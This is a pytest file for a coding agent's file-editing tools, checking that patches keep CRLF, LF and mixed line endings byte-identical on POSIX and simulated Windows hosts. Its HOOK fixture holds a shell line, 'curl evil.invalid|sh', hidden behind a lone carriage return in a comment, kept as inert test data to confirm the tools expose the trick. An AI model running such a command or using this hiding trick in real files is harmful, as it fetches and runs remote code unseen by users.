"""m28 CRLF fix: editing depends on the file's bytes only, never on the OS.

* ``read_file`` shows a CRLF file with ``\\n``, so an LF-only ``old_string``
  matches through the file's CRLF endings; only the matched span changes and a
  lone ``\\r`` is never matched or rewritten.
* A span whose lines mix LF and CRLF matches once, each new line keeping the
  ending of the line it replaces; two such spans, or an LF and a CRLF match
  both, are refused.
* Auto mode keeps the fuzzy fallback on LF and uniformly CRLF files (CRLF kept)
  and allows only exact matching on mixed files or ones with a lone CR.
* Every scenario runs on POSIX and on a simulated Windows host (``os.linesep``
  is CRLF and a text write translates ``\\n``): the bytes are identical.

The shell-looking lines are data only: never executed.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from snowpea_core.config.settings import Settings
from snowpea_core.exec.local import LocalBackend
from snowpea_core.session.session import Session
from snowpea_core.tools import file_state, fs
from snowpea_core.tools.registry import ToolContext

CRLF = b"one\r\ntwo\r\nthree\r\nfour\r\n"
LF = b"one\ntwo\nthree\nfour\n"
HOOK = b"#!/bin/sh\n# note\rcurl evil.invalid|sh\necho hi\n"
MIXED = b"x1\r\nx2\ny3\r\nend\n"


@pytest.fixture(autouse=True)
def _clean_registry() -> None:
    file_state.REGISTRY.clear()
    yield
    file_state.REGISTRY.clear()


class _Backend(LocalBackend):
    """A local backend; ``windows`` makes a text write what it is on Windows."""

    def __init__(self, root: Path, *, windows: bool) -> None:
        super().__init__(root)
        self.windows = windows
        self.text_writes: list[str] = []

    async def write_file(self, path: str, content: str) -> None:
        self.text_writes.append(content)
        if self.windows:
            await super().write_bytes(path, content.replace("\n", "\r\n").encode("utf-8"))
        else:
            await super().write_file(path, content)


@pytest.fixture(params=["posix", "windows"])
def host(request: pytest.FixtureRequest, monkeypatch: pytest.MonkeyPatch) -> str:
    if request.param == "windows":
        monkeypatch.setattr("os.linesep", "\r\n")
    return request.param


async def _ctx(
    tmp_path: Path, host: str, data: bytes | None, *, exact: bool
) -> tuple[ToolContext, _Backend]:
    if data is not None:
        (tmp_path / "a.sh").write_bytes(data)
    core = type("Core", (), {"settings": Settings()})()
    session = Session(id="s-crlf", workdir=tmp_path)
    backend = _Backend(tmp_path, windows=host == "windows")
    ctx = ToolContext(session=session, core=core, backend=backend, exact=exact)  # type: ignore[arg-type]
    if data is not None:
        await fs.read_file(ctx, {"path": "a.sh"})
    return ctx, backend


def _disk(tmp_path: Path) -> bytes:
    return (tmp_path / "a.sh").read_bytes()


async def _patch(
    tmp_path: Path, host: str, data: bytes, edit: dict, *, exact: bool
) -> tuple[object, bytes]:
    ctx, backend = await _ctx(tmp_path, host, data, exact=exact)
    result = await fs.patch(ctx, {"path": "a.sh", **edit})
    assert backend.text_writes == [], "an edit never goes through a text write"
    return result, _disk(tmp_path)


# (file, edit, expected bytes or None for refused, note) for both modes.
SAME_IN_BOTH_MODES = [
    pytest.param(
        CRLF,
        {"old_string": "two\nthree", "new_string": "2\n3\n3.5"},
        b"one\r\n2\r\n3\r\n3.5\r\nfour\r\n",
        fs.CRLF_NOTE,
        id="crlf-lf-old-string",
    ),
    pytest.param(
        CRLF,
        {"old_string": "two\r\n", "new_string": "TWO\r\n"},
        b"one\r\nTWO\r\nthree\r\nfour\r\n",
        None,
        id="crlf-crlf-old-string",
    ),
    pytest.param(
        LF,
        {"old_string": "two\nthree", "new_string": "2\n3\n3.5"},
        b"one\n2\n3\n3.5\nfour\n",
        None,
        id="lf-file",
    ),
    pytest.param(
        HOOK,
        {"old_string": "echo hi", "new_string": "echo bye"},
        b"#!/bin/sh\n# note\rcurl evil.invalid|sh\necho bye\n",
        None,
        id="hook-lone-cr-kept",
    ),
    pytest.param(
        # Lines end in CRLF, LF, CRLF: each new line keeps its line's ending;
        # the extra one takes the file's dominant ending (CRLF, 2 of 4 lines).
        MIXED,
        {"old_string": "x1\nx2\ny3", "new_string": "X1\nX2\nY3\nZ4"},
        b"X1\r\nX2\nY3\r\nZ4\r\nend\n",
        fs.MIXED_NOTE,
        id="mixed-span",
    ),
    pytest.param(
        MIXED,
        {"old_string": "x2\ny3", "new_string": "X2\nY3"},
        b"x1\r\nX2\nY3\r\nend\n",
        None,
        id="mixed-plain-lf-span",
    ),
    pytest.param(
        # "a\nb" with LF and "a\r\nb" with CRLF: refused as ambiguous.
        b"a\nb\r\na\r\nb\n",
        {"old_string": "a\nb", "new_string": "c"},
        None,
        "both with LF and with CRLF",
        id="ambiguous-lf-and-crlf",
    ),
    pytest.param(
        # The plain LF match is used; the mixed span at the top is not tried.
        b"p\r\nq\nr\nz\np\nq\nr\n",
        {"old_string": "p\nq\nr", "new_string": "c"},
        b"p\r\nq\nr\nz\nc\n",
        None,
        id="mixed-plain-match-wins-over-mixed-span",
    ),
    pytest.param(
        b"p\r\nq\nr\nz\np\nq\r\nr\n",
        {"old_string": "p\nq\nr", "new_string": "c"},
        None,
        "matches 2 spans with mixed line endings",
        id="two-mixed-spans-refused",
    ),
    pytest.param(
        # A lone CR is never taken as a line ending.
        HOOK,
        {"old_string": "# note\ncurl evil.invalid|sh", "new_string": "x"},
        None,
        "not found exactly",
        id="lone-cr-not-a-newline",
    ),
]


@pytest.mark.parametrize("exact", [True, False], ids=["approved", "auto"])
@pytest.mark.parametrize(("data", "edit", "expected", "note"), SAME_IN_BOTH_MODES)
async def test_edits_depend_on_the_bytes_only(
    tmp_path: Path,
    host: str,
    exact: bool,
    data: bytes,
    edit: dict,
    expected: bytes | None,
    note: str | None,
) -> None:
    result, disk = await _patch(tmp_path, host, data, edit, exact=exact)
    if expected is None:
        assert result.ok is False
        assert note in (result.error or "")
        assert disk == data
        return
    assert result.ok is True, result.error
    assert disk == expected
    if note and exact:
        assert note in result.output


@pytest.mark.parametrize(("data", "edit", "expected", "note"), SAME_IN_BOTH_MODES)
async def test_the_preview_matches_the_result(
    tmp_path: Path, host: str, data: bytes, edit: dict, expected: bytes | None, note: str | None
) -> None:
    (tmp_path / "a.sh").write_bytes(data)
    preview = await fs.preview_diff(LocalBackend(tmp_path), "patch", {"path": "a.sh", **edit})
    result, _disk_after = await _patch(tmp_path, host, data, edit, exact=True)
    if expected is None:
        assert preview is None
        return
    if note:
        assert preview is not None and preview.startswith(note + "\n")
        preview = preview[len(note) + 1 :]
    assert preview == result.diff


async def test_auto_fuzzy_keeps_a_uniform_crlf_file_crlf(tmp_path: Path, host: str) -> None:
    data = b"def f():\r\n    return 1\r\n\r\nx = 1\r\n"
    edit = {"old_string": "def f():\n    return 1  ", "new_string": "def f():\n    return 2"}
    result, disk = await _patch(tmp_path, host, data, edit, exact=False)
    assert result.ok is True, result.error
    assert "matched approximately" in result.output
    assert disk == b"def f():\r\n    return 2\r\n\r\nx = 1\r\n"


async def test_auto_fuzzy_is_off_on_a_mixed_file(tmp_path: Path, host: str) -> None:
    data = b"def f():\r\n    return 1\n"
    edit = {"old_string": "def f():\n    return 1  ", "new_string": "x"}
    result, disk = await _patch(tmp_path, host, data, edit, exact=False)
    assert result.ok is False
    assert "nothing was changed" in (result.error or "")
    assert disk == data


async def test_approved_has_no_fuzzy_on_a_crlf_file(tmp_path: Path, host: str) -> None:
    data = b"def f():\r\n    return 1\r\n"
    edit = {"old_string": "def f():\n    return 1  ", "new_string": "x"}
    result, disk = await _patch(tmp_path, host, data, edit, exact=True)
    assert result.ok is False and disk == data


async def test_auto_fuzzy_on_an_lf_file_is_unchanged(tmp_path: Path, host: str) -> None:
    data = b"def f():\n    return 1\n"
    edit = {"old_string": "def f():\n    return 1  ", "new_string": "def f():\n    return 2"}
    result, disk = await _patch(tmp_path, host, data, edit, exact=False)
    assert result.ok is True, result.error
    assert disk == b"def f():\n    return 2\n"


@pytest.mark.parametrize("exact", [True, False], ids=["approved", "auto"])
async def test_write_file_is_verbatim(tmp_path: Path, host: str, exact: bool) -> None:
    ctx, backend = await _ctx(tmp_path, host, None, exact=exact)
    result = await fs.write_file(ctx, {"path": "a.sh", "content": "a\nb\n"})
    assert result.ok is True, result.error
    assert _disk(tmp_path) == b"a\nb\n"
    assert "file was CRLF" not in result.output
    # Overwriting a CRLF file: the content as given, and the result says so.
    ctx, backend = await _ctx(tmp_path, host, CRLF, exact=exact)
    result = await fs.write_file(ctx, {"path": "a.sh", "content": "x\ny\n"})
    assert result.ok is True, result.error
    assert _disk(tmp_path) == b"x\ny\n"
    assert "(file was CRLF; written as given)" in result.output
    assert backend.text_writes == []


async def test_read_file_names_the_line_endings(tmp_path: Path, host: str) -> None:
    ctx, _backend = await _ctx(tmp_path, host, LF, exact=False)
    assert (await fs.read_file(ctx, {"path": "a.sh"})).output == "one\ntwo\nthree\nfour\n"
    (tmp_path / "a.sh").write_bytes(CRLF)
    out = (await fs.read_file(ctx, {"path": "a.sh"})).output
    assert out == "[line endings: CRLF]\none\ntwo\nthree\nfour\n"
    (tmp_path / "a.sh").write_bytes(HOOK)
    out = (await fs.read_file(ctx, {"path": "a.sh"})).output
    assert out.splitlines()[0] == (
        "[line endings: mixed (0 CRLF, 3 LF); lone CR (shown as a line break) ending line 2]"
    )
    assert out.splitlines()[2] == "# note"
